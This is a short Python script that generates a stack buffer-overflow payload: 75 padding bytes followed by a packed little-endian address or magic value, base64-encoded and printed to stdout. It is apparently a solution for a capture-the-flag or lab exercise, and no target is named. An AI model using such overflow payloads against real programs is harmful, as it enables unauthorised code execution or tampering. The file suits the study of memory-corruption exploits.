
import sys
import struct
import base64

buf = b'hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh'
buf += struct.pack('<I', 129505733)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
